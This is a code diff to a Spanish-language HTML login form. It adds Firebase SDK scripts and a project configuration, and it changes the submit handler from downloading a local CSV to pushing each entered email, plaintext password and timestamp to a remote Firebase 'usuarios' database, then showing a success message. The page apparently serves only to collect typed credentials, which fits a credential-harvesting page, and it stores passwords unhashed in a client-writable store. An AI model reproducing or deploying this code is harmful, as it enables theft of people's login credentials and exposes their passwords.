@@ -76,7 +76,27 @@
     <button type="submit" class="btn">Siguiente</button>
   </form>
 
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
   <script>
+    // Tu configuración de Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyAeYcdtKNuEMhV9F13dx8hl9VTw1AD6_g4",
+      authDomain: "loginapp-97da2.firebaseapp.com",
+      projectId: "loginapp-97da2",
+      storageBucket: "loginapp-97da2.firebasestorage.app",
+      messagingSenderId: "1071075004144",
+      appId: "1:1071075004144:web:67e75c55c7d4836e59fc35",
+      measurementId: "G-H7B3WQ834E"
+    };
+
+    // Inicializar Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // Enviar datos al hacer submit
     document.getElementById('formulario').addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -84,15 +104,15 @@
       const clave = document.getElementById('clave').value;
       const fecha = new Date().toLocaleString();
 
-      const contenido = "Correo,Clave,Fecha\n" + `${correo},${clave},${fecha}`;
-      const blob = new Blob([contenido], { type: 'text/csv;charset=utf-8;' });
-      const url = URL.createObjectURL(blob);
+      // Guardar en la base de datos
+      database.ref('usuarios').push({
+        correo: correo,
+        clave: clave,
+        fecha: fecha
+      });
 
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'datos_login.csv';
-      a.click();
-      URL.revokeObjectURL(url);
+      alert("Datos enviados correctamente.");
+      document.getElementById('formulario').reset();
     });
   </script>
 
